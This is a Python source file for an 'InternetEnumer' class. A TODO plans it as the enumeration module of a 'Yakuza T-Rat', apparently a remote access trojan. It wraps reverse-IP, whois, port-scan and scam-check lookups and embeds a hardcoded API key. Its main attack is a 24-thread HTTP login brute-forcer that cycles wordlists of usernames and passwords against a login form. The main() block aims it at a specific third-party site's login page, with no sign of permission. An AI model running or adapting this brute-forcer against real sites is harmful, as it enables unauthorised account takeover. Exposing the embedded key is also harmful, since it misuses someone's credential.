'''TODO
0. add translator for Scam Detecion Result
1. Add Option Menu
2. Completed & Packaged Class to Use in Yakuza T-Rat as Internet Enumeration Module
3. Complete Scam Detection..
Until => Scam Detection Function
'''

import requests
import json
import time
from colorama import Fore, Back, Style, init
from bs4 import BeautifulSoup
import concurrent.futures

class InternetEnumer():
    def __init__(self):
        self.viewDnsToken = '8b68262a1806e38816e34b9aca3cf11106bf08d2'
        self.result = ''
    
    def reverse_ip_finder(self, url):
        try:
            reqUrl = 'https://domains.yougetsignal.com/domains.php'
            payload = {'remoteAddress':url, 'key':''}
            response = requests.post(reqUrl, data=payload)
            resAsDict = json.loads(response.content.decode())
            
            if resAsDict['status'] == 'Success':
                print(Fore.YELLOW+f'[+] Result: Founded {resAsDict['domainCount']} Websites in same host with https://{resAsDict['remoteAddress']}'+Style.RESET_ALL)
                
                for domain in resAsDict['domainArray']:
                    self.result += f'{domain}\n'
                    print(Fore.LIGHTCYAN_EX+f'[+] {domain}'+Style.RESET_ALL)
                
                return self.result, True
                self.result = ''
            else:
                print(Fore.LIGHTRED_EX + '[-] Reverse IP Finder: Domain Wronge or Not Found!!!'+Style.RESET_ALL)
                return False
            
        except requests.RequestException or requests.ConnectionError:
            print(Fore.LIGHTRED_EX + '[-] Reverse IP Finder: Internet Connection Error!!!'+Style.RESET_ALL)
            return False
        
        except Exception as e:
            print(Fore.LIGHTRED_EX + '[-] Reverse IP Finder: Unknown Error happened!!!'+Style.RESET_ALL)
            print(f'Error Content: {e}')
            return False

    def whois_small(self, url):
        '''Summary
        this function give a domain and 
        return whois information of domain
        '''
        try:
            reqUrl = 'https://www.yougetsignal.com/tools/whois-lookup/php/get-whois-lookup-json-data.php'
            payload = {'remoteAddress':url}
            
            response = json.loads(requests.post(reqUrl, data=payload).content.decode())
            
            if response['status'] == 'Success':
                #Formating whois result 
                whois = str(response['whoisData']).replace('<br />','').replace('%','[+] ')
                
                #Formating whois result and then 
                whoisNotes, whoisData = whois.split('\n\n\n',1)
                whoisNotes = whoisNotes.split('\n')
                
                #print whoisNotes & whoisData 
                print(Fore.YELLOW + f'Whois Record founded for => ' + Fore.LIGHTGREEN_EX + response['remoteAddress']+Style.RESET_ALL)
                print(Fore.LIGHTRED_EX+ 'Whois Notes: \n'+ Fore.LIGHTYELLOW_EX + f'{whoisNotes}' + Style.RESET_ALL+'\n')
                print(Fore.LIGHTRED_EX+ 'Whois Data: \n' + Fore.LIGHTCYAN_EX + f'{whoisData}' + Style.RESET_ALL)
                
                #return whoisData, whoisNotes, True
                return {'success':True,'whoisData':whoisData, 'whoisNotes':whoisNotes}
            else:
                print(Fore.LIGHTRED_EX + '[-] Whois Record: Wrong Domain or Host Not Founded!!!'+Style.RESET_ALL)
            
        except requests.RequestException or requests.ConnectionError:
            print(Fore.LIGHTRED_EX + '[-] Whois Record: Internet Connection Error!!!'+Style.RESET_ALL)
            return False
        
        except Exception as e:
            print(Fore.LIGHTRED_EX + '[-] Whois Record: Unknown Error!!!'+Style.RESET_ALL)
            print(f'Error Content: {e}')
            return False
    
    def open_ports(self, url):
        '''summary
        this function get host open ports
        and return as dict have openPorts & closedPorts Keys
        '''
        
        reqUrl = f'https://api.viewdns.info/portscan/?host={url}&apikey={self.viewDnsToken}&output=json'
        #payload = {'host':url,'output':'json','apikey':self.viewDnsToken}
        try:
            respose = requests.get(reqUrl).text
            respose = json.loads(respose)
            
            result = {'openPorts':[],'closedPorts':[]}
            
            for x in respose['response']['port']:
                
                if x['status'] == 'closed':        
                    print(Fore.YELLOW + f'[+] Service: {x['service']} On ' + Fore.LIGHTCYAN_EX + \
                    f'Port: {x['number']} and ' + Fore.LIGHTRED_EX + f'Port is  {x['status']}'+ Style.RESET_ALL+'\n')
                    
                    result['closedPorts'].append(f'{x['service']}-{x['number']}')
                    
                elif x['status'] == 'open':
                    print(Fore.YELLOW + f'[+] Service: {x['service']} On ' + Fore.LIGHTCYAN_EX + \
                    f'Port: {x['number']} and ' + Fore.LIGHTGREEN_EX + f'Port is {x['status']}' + Style.RESET_ALL+'\n')
                    
                    result['openPorts'].append(f'{x['service']}-{x['number']}')
                    
                else:
                    print(Fore.YELLOW + f'[+] Service: {x['service']} On ' + Fore.LIGHTCYAN_EX + \
                    f'Port: {x['number']} and ' + Fore.LIGHTYELLOW_EX + f'Port is Unknown {x['status']}'+ Style.RESET_ALL+'\n')
                    
                    result['closedPorts'].append(f'{x['service']}-{x['number']}')
        except requests.RequestException or requests.ConnectionError:
            print(Fore.LIGHTRED_EX + '[-] Port Scanner: Internet Connection Error!!!'+Style.RESET_ALL)
            return False
        
        except Exception as e:
            print(Fore.LIGHTRED_EX + '[-] Port Scanner: Unknown Error!!!'+Style.RESET_ALL)
            print(f'Error Content: {e}')
            return False    
        return result
    
    def scam_detection(self, url):
        '''summary
        this function detect scam website
        '''
        reqUrl = f'https://scamminder.com/websites/{url}/' 
        #secondReqUrl = 'https://www.scamadviser.com/check-website'
        
        try:
            response = requests.get(reqUrl)
            soup = BeautifulSoup(response.content.decode(),'html.parser')

            #Find div tag contain Result of Response
            aiResult = str(soup.findAll('div',attrs= {'class':'card-text p-10'}))[29:-7]
            aiAnalyze, aiReason  = aiResult.split('<br/><br/><b>', 1)
            print(Fore.GREEN + f'[+] AI Analyze => \n' + Fore.WHITE + f'{aiAnalyze}'+Style.RESET_ALL+'\n')
            print(Fore.GREEN + f'[+] AI Reason for this Analyze => \n' + Fore.WHITE + f'{aiReason}'+Style.RESET_ALL+'\n')
            
            negativePoint = soup.findAll('table', attrs={'class':'table table-borderless'})
            negativePoint2 = soup.findAll('p', attrs={'class':'mb-0 fw-medium'})
            
            print(Fore.GREEN +f'\n[+] Negative and Positive point of {url}'+Style.RESET_ALL+'\n')
            
            for x in negativePoint:
                tableRow = x.findAll('td')
                for y in tableRow:
                    formatedRes = str(y.text).replace('  ','\n')
                    print(Fore.YELLOW + f'[+] {formatedRes} \n'+Style.RESET_ALL)
                
        
        except requests.RequestException or requests.ConnectionError:
            print(Fore.LIGHTRED_EX + '[-] Scam Detection: Internet Connection Error!!!'+Style.RESET_ALL)
            return False
        
        except Exception as e:
            print(Fore.LIGHTRED_EX + '[-] Scam Detection: Unknown Error!!!'+Style.RESET_ALL)
            print(f'Error Content: {e}')
            return False
    
    def http_bruteforcer(self, url):
        '''summary:
        this function perform bruteforce attack on http, simple and without proxy or evasion techniques
        note: you should config Payload(HTTP Post Data) for each URL 
        '''
        #userFile = open('..\\wordlists\\userstop.txt','r+')
        #passFile = open(r'../wordlists/passwords1000.txt','r+')
        
        try:
            with open(r'../wordlists/userstop.txt','r+') as userNames, \
                open(r'../wordlists/passwords10000.txt','r+') as passwords:
                    userFile = [line.strip() for line in userNames] 
                    passFile =[line.strip() for line in passwords]
                    #for line in userNames:
                        #userFile = line.strip()
                
        except FileNotFoundError:
            print(Fore.LIGHTRED_EX + '[-] Http Bruteforcer: File Not Found!!!'+Style.RESET_ALL)
            return False
        except Exception as e:
            print(Fore.LIGHTRED_EX + '[-] Http Bruteforcer: Unknown Error when Opening File!!!\n'+Style.RESET_ALL)
            print(f'Error Content: {e}')
            return False    
       
        result = {}
        maybeResult = {}
        
        def attempt_login(user, passwd):
            payload = {
                        'ajax':'nm',
                        'option':'login',
                        'field_user':user,
                        'field_pass':passwd,
                        'form_login':'',
                        'language':'en_us',
                        'keep_logged':'false'
                    }
            
            try:
                response = requests.post(url, data=payload)
                if 'error' in response.text or response.status_code == 404:
                    print(Fore.LIGHTRED_EX + f'[-] Http Bruteforcer: Wrong Credentials for {user}:{passwd}'+Style.RESET_ALL)
                    
                elif ('success' in response.text.lower() or 'welcome' in response.text.lower()) \
                    and response.status_code == 200:         
                            
                    print(Fore.YELLOW + '\n [+] HTTP Bruteforcer: Credentials Founded => ' \
                                +Fore.LIGHTGREEN_EX+f'Username: {user} Password: {passwd}'+Style.RESET_ALL)
                    
                    return (user, passwd, True)
                #result.update({f'Username: {user}':f'Password: {passwd}'})
                            
                elif response.status_code == 400:
                    print(Fore.RED+f'[-] Http Bruteforcer: Cant Send Request')
                    return None
                        
                else:
                    print(Fore.LIGHTYELLOW_EX + f'[-++] Maybe In-Doubt Credentials Founded => ' \
                                +Fore.LIGHTCYAN_EX+f'Username: {user} Password: {passwd}'+Style.RESET_ALL)
                    
                    return (user, passwd, False)       
                    #maybeResult.update({f'Username: {user}':f'Password: {passwd}'})
            except requests.RequestException or requests.ConnectionError:
                print(Fore.LIGHTRED_EX + '[-] Http Bruteforcer: Internet Connection Error!!!'+Style.RESET_ALL)
                return None
            except Exception as e:
                print(Fore.LIGHTRED_EX + '[-] Http Bruteforcer: Unknown Error in Login Attempt Function!!!\n'+Style.RESET_ALL)
                print(f'Error Content: {e}')
                return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=24) as executor:
            futures = [executor.submit(attempt_login,user,passwd) for user in userFile for passwd in passFile]
            
            for future in concurrent.futures.as_completed(futures):
                resultTuple = future.result()
                if resultTuple:
                    user, passwd, success = resultTuple
                    if success:
                        result[f'Username {user}'] = f'Password: {passwd}'
                    else:
                        maybeResult[f'Username {user}'] = f'Password: {passwd}'
                    
                
        #print result on screen
        print(Fore.YELLOW+f'Credentials Founded: {len(result)} => \n'+Style.RESET_ALL)
        print(Fore.LIGHTGREEN_EX+f'{result} \n'+Style.RESET_ALL)
        print(Fore.YELLOW+f'Maybe In-Doubt Credentials Founded: {len(maybeResult)} \n'+Style.RESET_ALL)
        print(Fore.WHITE+f'{maybeResult} \n'+Style.RESET_ALL)
        
        try:
        #Write results in file in name result.txt
            with open(r'../wordlists/results.txt','w') as resultFile:
                #Write Founded Credentials
                resultFile.write(f'Credentials Founded for {url}: {len(result)} => \n')
                for user,passwd in result.items():
                    resultFile.write(f'Username: {user} , Password {passwd} \n')
                
                #Write Maybe In-Doubt Credentials
                resultFile.write(f'Maybe In-Doubt Credentials Founded for {url}: {len(maybeResult)} => \n')
                for user, passwd in maybeResult.items():
                    resultFile.write(f'Username: {user} , Password {passwd} \n')
                
                print(Fore.CYAN + '[+] Http Bruteforcer: Founded Credentials write to results.txt'+Style.RESET_ALL)
        except Exception as e:
            print(Fore.LIGHTRED_EX + '[-] Http Bruteforcer: Unknown Error when Writing to File!!!\n'+Style.RESET_ALL)
        
        #return result
        return result, maybeResult
    

        
    def subfinder(self):
        pass

class main():
    internetEnum = InternetEnumer()
    bruteUrl = 'https://www.contratche.com.br/scriptcase9/devel/iface/login.php'
    
    #res = internetEnum.whois_small('sabzlearn.ir')
    #print(res[1])
    internetEnum.http_bruteforcer(bruteUrl)
    
if __name__ == '__main__':
    main()